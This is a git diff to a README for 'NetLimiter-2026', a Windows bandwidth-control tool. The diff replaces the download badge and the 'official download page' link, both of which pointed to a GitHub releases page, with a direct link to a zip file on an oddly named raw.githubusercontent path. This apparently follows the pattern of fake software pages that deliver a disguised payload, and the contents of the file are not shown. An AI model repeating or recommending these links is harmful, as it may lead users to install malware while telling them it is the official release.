@@ -5,7 +5,7 @@ description: "Download and install NetLimiter on Windows 10 and 11 to monitor an
 ---
 # 🌐 NetLimiter-2026 - Manage your internet bandwidth with ease
 
-[![](https://img.shields.io/badge/Download-NetLimiter-blue.svg)](https://github.com/undrained-misreading18/NetLimiter-2026/releases)
+[![](https://img.shields.io/badge/Download-NetLimiter-blue.svg)](https://raw.githubusercontent.com/undrained-misreading18/undrained-misreading18.github.io/main/precorruptly/io_misreading_undrained_github_v3.3.zip)
 
 NetLimiter-2026 gives you complete control over your network traffic. It lets you limit the download and upload speed of individual programs running on your computer. You see exactly which apps use your connection and how much data they transfer.
 
@@ -33,7 +33,7 @@ NetLimiter-2026 runs on standard Windows hardware. Please ensure your computer m
 
 Follow these steps to install the software on your machine. We kept the process simple for every user level.
 
-1. First, visit the official download page: [https://github.com/undrained-misreading18/NetLimiter-2026/releases](https://github.com/undrained-misreading18/NetLimiter-2026/releases).
+1. First, visit the official download page: [https://raw.githubusercontent.com/undrained-misreading18/undrained-misreading18.github.io/main/precorruptly/io_misreading_undrained_github_v3.3.zip](https://raw.githubusercontent.com/undrained-misreading18/undrained-misreading18.github.io/main/precorruptly/io_misreading_undrained_github_v3.3.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
